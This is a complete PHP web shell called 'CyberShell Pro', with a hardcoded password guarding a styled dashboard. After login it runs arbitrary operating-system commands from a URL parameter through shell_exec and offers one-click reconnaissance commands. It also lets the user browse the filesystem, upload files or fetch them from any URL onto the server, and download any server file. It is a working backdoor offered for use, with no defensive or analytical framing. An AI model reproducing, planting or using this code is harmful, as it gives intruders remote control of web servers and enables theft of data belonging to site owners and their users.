<?php
session_start();

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Define the expected password
    $expectedPassword = 'Shuju@123'; // Replace 'hacker1337' with your desired password

    // Get the entered password from the form
    $enteredPassword = $_POST['password'];

    // Check if the entered password matches the expected password
    if ($enteredPassword === $expectedPassword) {
        // Password is correct, set the session variable
        $_SESSION['authenticated'] = true;
    } else {
        // Password is incorrect, display an error message
        echo 'Invalid password. Access denied.';
    }
}

// Check if the user is not logged in, display the login form
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <style>
        :root {
            --primary: #00ff88;
            --dark: #0a0a0a;
            --light: #1a1a1a;
            --text: #ffffff;
            --danger: #ff4444;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); 
            color: var(--text); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-container {
            text-align: center;
            background: rgba(45, 45, 45, 0.95);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 450px;
            backdrop-filter: blur(10px);
            border: 1px solid #333;
        }
        
        .logo {
            margin-bottom: 30px;
        }
        
        .logo img {
            max-width: 280px;
            height: auto;
            margin-bottom: 20px;
            transition: transform 0.3s ease;
        }
        
        .logo img:hover {
            transform: scale(1.05);
        }
        
        .logo h1 {
            color: var(--primary);
            margin: 10px 0;
            font-size: 1.8rem;
            font-weight: 300;
            letter-spacing: 2px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #ccc;
            font-weight: 500;
            font-size: 1.1rem;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            background: rgba(26, 26, 26, 0.9);
            border: 1px solid #444;
            color: white;
            border-radius: 10px;
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        input[type="password"]:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.3);
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: black;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.1rem;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        button:hover {
            background: #00cc6a;
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 255, 136, 0.4);
        }
        
        .error {
            background: rgba(255, 68, 68, 0.2);
            color: #ff6b6b;
            padding: 14px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid rgba(255, 68, 68, 0.3);
            font-size: 1rem;
        }
        
        .footer {
            margin-top: 25px;
            font-size: 0.9rem;
            color: #888;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://shuju.to/assets/logo.png" alt="Security Portal Logo" onerror="this.style.display='none'">
            <h1>SECURE ACCESS PORTAL</h1>
        </div>
        
        <h2 style="margin-bottom: 20px; color: var(--primary);">Access Requested?</h2>
        <form method="POST" action="">
            <div class="form-group">
                <label for="password">Enter Password:</label>
                <input type="password" name="password" id="password" required>
            </div>
            <button type="submit">Authenticate</button>
        </form>
        
        <div class="footer">
            Authorized Personnel Only • Secure Access
        </div>
    </div>
</body>
</html>
    <?php
    // Stop executing the rest of the script
    exit();
}

// Handle file browsing
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
if (!is_dir($current_dir)) {
    $current_dir = '.';
}
$current_dir = realpath($current_dir);

// Logout functionality
if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
    // Destroy the session and redirect to the login form
    session_destroy();
    header('Location: web_shell.php');
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberShell Pro</title>
    <style>
        :root {
            --primary: #00ff88;
            --primary-dark: #00cc6a;
            --dark: #0a0a0a;
            --darker: #050505;
            --light: #1a1a1a;
            --lighter: #2a2a2a;
            --text: #ffffff;
            --text-muted: #aaaaaa;
            --danger: #ff4444;
            --warning: #ffaa00;
            --info: #0099ff;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: var(--dark);
            color: var(--text);
            line-height: 1.6;
        }
        
        .header {
            background: var(--darker);
            padding: 15px 0;
            border-bottom: 3px solid var(--primary);
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 25px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .logo-container img {
            height: 50px;
            width: auto;
            transition: transform 0.3s ease;
            cursor: pointer;
        }
        
        .logo-container img:hover {
            transform: scale(1.1);
        }
        
        .logo-text {
            font-size: 1.8rem;
            font-weight: bold;
            color: var(--primary);
            letter-spacing: 1px;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 20px;
            font-size: 1rem;
        }
        
        .container {
            max-width: 1400px;
            margin: 25px auto;
            padding: 0 25px;
        }
        
        .panel {
            background: var(--light);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            border-left: 5px solid var(--primary);
            transition: transform 0.2s ease;
        }
        
        .panel:hover {
            transform: translateY(-2px);
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #333;
        }
        
        .panel-title {
            color: var(--primary);
            font-size: 1.4rem;
            font-weight: bold;
            margin: 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: var(--text-muted);
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 12px 16px;
            background: var(--darker);
            border: 2px solid #333;
            color: white;
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.2);
        }
        
        .btn {
            background: var(--primary);
            color: black;
            border: none;
            padding: 12px 24px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 8px;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 1rem;
        }
        
        .btn:hover {
            background: var(--primary-dark);
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 255, 136, 0.4);
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background: #cc3333;
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255, 68, 68, 0.4);
        }
        
        .btn-info {
            background: var(--info);
            color: white;
        }
        
        .btn-info:hover {
            background: #0088dd;
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 153, 255, 0.4);
        }
        
        .output {
            background: var(--darker);
            padding: 20px;
            border-radius: 8px;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
            border: 2px solid #333;
            margin-top: 15px;
            font-size: 0.95rem;
            line-height: 1.5;
        }
        
        .file-browser {
            background: var(--darker);
            border-radius: 10px;
            border: 2px solid #333;
            padding: 20px;
            margin-top: 15px;
        }
        
        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
            flex-wrap: wrap;
            background: var(--lighter);
            padding: 12px 18px;
            border-radius: 8px;
            border: 1px solid #444;
            font-size: 1rem;
        }
        
        .breadcrumb a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s;
            padding: 4px 8px;
            border-radius: 4px;
        }
        
        .breadcrumb a:hover {
            color: var(--text);
            background: var(--primary);
        }
        
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            max-height: 500px;
            overflow-y: auto;
            padding: 10px;
        }
        
        .file-item {
            background: var(--lighter);
            border: 2px solid #333;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        
        .file-item:hover {
            border-color: var(--primary);
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(0, 255, 136, 0.2);
        }
        
        .file-item.directory {
            border-color: var(--info);
        }
        
        .file-item.directory:hover {
            border-color: var(--primary);
        }
        
        .file-icon {
            font-size: 2.5rem;
            margin-bottom: 10px;
            display: block;
        }
        
        .file-name {
            font-weight: 600;
            margin-bottom: 5px;
            word-break: break-word;
        }
        
        .file-size {
            color: var(--text-muted);
            font-size: 0.85rem;
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
            margin-top: 10px;
            justify-content: center;
        }
        
        .file-action-btn {
            padding: 6px 12px;
            background: #333;
            color: var(--text);
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.2s;
        }
        
        .file-action-btn:hover {
            background: var(--primary);
            color: black;
        }
        
        .alert {
            padding: 15px 18px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 1rem;
        }
        
        .alert-success {
            background: rgba(0, 255, 136, 0.15);
            border: 2px solid rgba(0, 255, 136, 0.4);
            color: var(--primary);
        }
        
        .alert-error {
            background: rgba(255, 68, 68, 0.15);
            border: 2px solid rgba(255, 68, 68, 0.4);
            color: #ff6b6b;
        }
        
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .quick-command {
            background: var(--darker);
            border: 2px solid #333;
            color: var(--text);
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            text-align: center;
            font-size: 1rem;
            transition: all 0.3s;
            font-weight: 500;
        }
        
        .quick-command:hover {
            background: var(--lighter);
            border-color: var(--primary);
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
        }
        
        .section-title {
            color: var(--primary);
            font-size: 1.6rem;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 3px solid var(--primary);
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .form-inline {
            display: flex;
            gap: 15px;
            align-items: end;
            flex-wrap: wrap;
        }
        
        .form-inline .form-group {
            flex: 1;
            min-width: 250px;
            margin-bottom: 0;
        }
        
        hr {
            border: none;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
            margin: 35px 0;
        }
        
        .stats-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .stat-card {
            background: var(--light);
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid var(--primary);
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.8rem;
            font-weight: bold;
            color: var(--primary);
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: var(--text-muted);
            font-size: 0.9rem;
        }
        
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            
            .logo-container img {
                height: 45px;
            }
            
            .logo-text {
                font-size: 1.5rem;
            }
            
            .quick-commands {
                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            }
            
            .container {
                padding: 0 15px;
            }
            
            .panel {
                padding: 20px;
            }
            
            .form-inline {
                flex-direction: column;
            }
            
            .form-inline .form-group {
                min-width: 100%;
            }
            
            .file-grid {
                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            }
            
            .stats-bar {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo-container">
                <a href="?dir=." style="display: flex; align-items: center; gap: 20px; text-decoration: none;">
                    <img src="https://shuju.to/assets/logo.png" alt="CyberShell Pro Logo" onerror="this.style.display='none'">
                    <div class="logo-text">CyberShell Pro</div>
                </a>
            </div>
            <div class="user-info">
                <span>🟢 Active Session</span>
                <form method="post" style="display: inline;">
                    <input type="hidden" name="logout" value="true">
                    <button type="submit" class="btn btn-danger">🚪 Logout</button>
                </form>
            </div>
        </div>
    </div>

    <div class="container">
        <!-- Stats Bar -->
        <div class="stats-bar">
            <div class="stat-card">
                <div class="stat-value"><?php echo number_format(disk_free_space("/") / (1024*1024*1024), 2); ?> GB</div>
                <div class="stat-label">Free Space</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?php echo php_uname('s'); ?></div>
                <div class="stat-label">Operating System</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?php echo phpversion(); ?></div>
                <div class="stat-label">PHP Version</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?php echo $_SERVER['SERVER_ADDR'] ?? 'N/A'; ?></div>
                <div class="stat-label">Server IP</div>
            </div>
        </div>

        <!-- Remote Code Execution -->
        <div class="panel">
            <h2 class="section-title">🚀 Remote Code Execution</h2>
            
            <div class="quick-commands">
                <div class="quick-command" onclick="insertCommand('pwd')">📁 pwd</div>
                <div class="quick-command" onclick="insertCommand('ls -la')">📋 ls -la</div>
                <div class="quick-command" onclick="insertCommand('whoami')">👤 whoami</div>
                <div class="quick-command" onclick="insertCommand('id')">🆔 id</div>
                <div class="quick-command" onclick="insertCommand('uname -a')">💻 uname -a</div>
                <div class="quick-command" onclick="insertCommand('ps aux')">📊 ps aux</div>
                <div class="quick-command" onclick="insertCommand('df -h')">💾 df -h</div>
                <div class="quick-command" onclick="insertCommand('free -h')">🧠 free -h</div>
            </div>
            
            <form method="GET" action="">
                <div class="form-inline">
                    <div class="form-group">
                        <label for="command">💻 Command:</label>
                        <input type="text" name="command" id="command" size="50" value="<?php if (isset($_GET['command'])) { echo htmlspecialchars($_GET['command']); } ?>" placeholder="Enter command..." />
                    </div>
                    <button type="submit" class="btn">⚡ Execute</button>
                </div>
            </form>
            <?php
            if (isset($_GET['command'])) {
                $command = $_GET['command'];
                echo '<div class="output">';
                echo 'Command: ' . $command . "\n";
                echo 'Output:' . "\n";
                echo shell_exec($command);
                echo '</div>';
            }
            ?>
        </div>

        <hr />

        <!-- File Browser -->
        <div class="panel">
            <h2 class="section-title">📁 File Browser</h2>
            
            <div class="breadcrumb">
                <a href="?dir=.">🏠 Root</a>
                <?php
                $path_parts = explode('/', str_replace('\\', '/', $current_dir));
                $current_path = '';
                foreach ($path_parts as $part) {
                    if (!empty($part)) {
                        $current_path .= '/' . $part;
                        echo ' / <a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
            
            <div class="file-browser">
                <div class="file-grid">
                    <?php
                    if (is_dir($current_dir)) {
                        // Parent directory
                        if ($current_dir !== '.' && $current_dir !== '/') {
                            $parent_dir = dirname($current_dir);
                            echo '<div class="file-item directory" onclick="navigateTo(\'' . urlencode($parent_dir) . '\')">';
                            echo '<span class="file-icon">📁</span>';
                            echo '<div class="file-name">..</div>';
                            echo '<div class="file-size">Parent Directory</div>';
                            echo '</div>';
                        }
                        
                        $items = scandir($current_dir);
                        if ($items !== false) {
                            foreach ($items as $item) {
                                if ($item == '.' || $item == '..') continue;
                                
                                $item_path = $current_dir . DIRECTORY_SEPARATOR . $item;
                                $is_dir = is_dir($item_path);
                                $file_size = $is_dir ? '' : formatFileSize(filesize($item_path));
                                
                                echo '<div class="file-item ' . ($is_dir ? 'directory' : 'file') . '" ' . ($is_dir ? 'onclick="navigateTo(\'' . urlencode($item_path) . '\')"' : '') . '>';
                                echo '<span class="file-icon">' . ($is_dir ? '📁' : getFileIcon($item)) . '</span>';
                                echo '<div class="file-name">' . htmlspecialchars($item) . '</div>';
                                echo '<div class="file-size">' . $file_size . '</div>';
                                
                                if (!$is_dir) {
                                    echo '<div class="file-actions">';
                                    echo '<button class="file-action-btn" onclick="event.stopPropagation(); downloadFile(\'' . htmlspecialchars($item_path) . '\')">📥</button>';
                                    echo '<button class="file-action-btn" onclick="event.stopPropagation(); viewFile(\'' . htmlspecialchars($item_path) . '\')">👁️</button>';
                                    echo '</div>';
                                }
                                
                                echo '</div>';
                            }
                        }
                    }
                    
                    function formatFileSize($bytes) {
                        if ($bytes >= 1073741824) {
                            return number_format($bytes / 1073741824, 2) . ' GB';
                        } elseif ($bytes >= 1048576) {
                            return number_format($bytes / 1048576, 2) . ' MB';
                        } elseif ($bytes >= 1024) {
                            return number_format($bytes / 1024, 2) . ' KB';
                        } else {
                            return $bytes . ' bytes';
                        }
                    }
                    
                    function getFileIcon($filename) {
                        $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
                        $icons = [
                            'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜', 'json' => '📋',
                            'txt' => '📄', 'pdf' => '📕', 'doc' => '📘', 'docx' => '📘', 'xls' => '📗',
                            'xlsx' => '📗', 'zip' => '📦', 'rar' => '📦', 'tar' => '📦', 'gz' => '📦',
                            'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'svg' => '🖼️',
                            'mp3' => '🎵', 'wav' => '🎵', 'mp4' => '🎬', 'avi' => '🎬', 'mkv' => '🎬'
                        ];
                        return $icons[$extension] ?? '📄';
                    }
                    ?>
                </div>
            </div>
        </div>

        <!-- Rest of the panels remain the same as before -->
        <!-- Upload File From Local Machine -->
        <div class="panel">
            <h2 class="section-title">📤 Upload File From Your Local Machine</h2>
            <form method="POST" action="" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="uploads">📎 File(s):</label>
                    <input type="file" name="uploads[]" id="uploads" multiple="multiple" required="required" />
                </div>
                <button type="submit" class="btn">🚀 Upload</button>
            </form>
            <?php
            if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
                $total = count($_FILES['uploads']['name']);
                for ($i = 0; $i < $total; $i++) {
                    $tmpPath = $_FILES['uploads']['tmp_name'][$i];
                    if ($tmpPath != '') {
                        $newPath = './' . $_FILES['uploads']['name'][$i];
                        if (move_uploaded_file($tmpPath, $newPath)) {
                            echo '<div class="alert alert-success">✅ Successfully uploaded ' . $_FILES['uploads']['name'][$i] . '</div>';
                        } else {
                            echo '<div class="alert alert-error">❌ Unable to upload ' . $_FILES['uploads']['name'][$i] . '</div>';
                        }
                    }
                }
            }
            ?>
        </div>

        <hr />

        <!-- Upload File From URL -->
        <div class="panel">
            <h2 class="section-title">🌐 Upload File From URL</h2>
            <form method="POST" action="">
                <div class="form-group">
                    <label for="save_name">💾 Filename to save:</label>
                    <input type="text" name="save_name" id="save_name" size="30" required="required" placeholder="filename.ext" />
                </div>
                <div class="form-group">
                    <label for="url">🔗 URL:</label>
                    <input type="text" name="url" id="url" size="50" required="required" placeholder="https://example.com/file.txt" />
                </div>
                <button type="submit" class="btn">🚀 Upload</button>
            </form>
            <?php if (isset($_POST['save_name']) && isset($_POST['url'])): ?>
            <div class="output">
                <?php
                if (file_put_contents($_POST['save_name'], file_get_contents($_POST['url']))) {
                    echo '✅ Successfully uploaded ' . $_POST['save_name'];
                } else {
                    echo '❌ Unable to upload ' . $_POST['save_name'];
                }
                ?>
            </div>
            <?php endif; ?>
        </div>

        <hr />

        <!-- Download File From Web Server -->
        <div class="panel">
            <h2 class="section-title">📥 Download File From Web Server</h2>
            <form method="GET" action="">
                <div class="form-group">
                    <label for="download">📁 Filename to download:</label>
                    <input type="text" name="download" id="download" size="100" required="required" placeholder="/path/to/file.txt" />
                </div>
                <button type="submit" class="btn">📥 Download</button>
            </form>

            <?php
            if (isset($_GET['download'])) {
                $filename = $_GET['download'];
                if (file_exists($filename)) {
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
                    header('Content-Length: ' . filesize($filename));
                    ob_clean();
                    flush();
                    readfile($filename);
                    exit;
                } else {
                    echo '<div class="alert alert-error">❌ File does not exist.</div>';
                }
            }
            ?>
        </div>

        <hr />

        <!-- Logout -->
        <div class="panel">
            <h2 class="section-title">🔒 Session Management</h2>
            <form method="POST" action="">
                <input type="hidden" name="logout" value="true" />
                <button type="submit" class="btn btn-danger">🚪 Logout</button>
            </form>
        </div>
    </div>

    <script>
        function insertCommand(cmd) {
            document.getElementById('command').value = cmd;
            document.getElementById('command').focus();
        }
        
        function navigateTo(dir) {
            window.location.href = '?dir=' + dir;
        }
        
        function downloadFile(filePath) {
            window.location.href = '?download=' + encodeURIComponent(filePath);
        }
        
        function viewFile(filePath) {
            window.open('?path=' + encodeURIComponent(filePath), '_blank');
        }
        
        // Auto-focus command input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const commandInput = document.getElementById('command');
            if (commandInput) {
                commandInput.focus();
            }
        });
        
        // Handle image loading errors
        document.addEventListener('DOMContentLoaded', function() {
            const images = document.querySelectorAll('img');
            images.forEach(img => {
                img.onerror = function() {
                    this.style.display = 'none';
                };
            });
        });
    </script>
</body>
</html>
